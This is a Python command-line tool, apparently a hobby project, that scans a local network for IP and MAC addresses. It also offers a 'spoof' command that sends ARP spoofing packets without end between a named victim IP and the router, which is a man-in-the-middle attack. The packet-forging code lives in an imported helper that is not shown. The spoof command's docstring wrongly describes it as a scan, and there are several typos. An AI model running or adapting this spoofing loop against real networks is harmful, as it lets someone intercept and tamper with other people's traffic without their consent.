from time import sleep
import click_spinner
from helpers.arp import network_scan, arp_spoof
import typer

app = typer.Typer()

@app.command()
def about():
    """
    About this program
    """    
    typer.echo("A pyhthon network scanner")

@app.command()
def spoof(victim_ip: str, router_ip: str):
    """
    Scan the network to find the mac addresses
    
    Args:
        ip (str): The ip address
    """
    package_count = 0
    while True:
        arp_spoof(victim_ip, router_ip)
        arp_spoof(router_ip, victim_ip)
        print("\r", "Paclakage send:" + str(package_count) , end="")
        package_count = package_count + 2
        sleep(1)


@app.command()
def scan(ip: str):
    """
    Scan the network to find the mac addresses

    Args:
        ip (str): The ip address
    """
    with click_spinner.spinner():
        devices = network_scan(ip)
    typer.echo("IP\t\t\tMAC Address\t\t\tName")
    for ip in devices.keys():
            typer.echo(f"{ip}\t\t{devices[ip]['mac']}\t\t{devices[ip]['name']}")

if __name__ == "__main__":
    app()
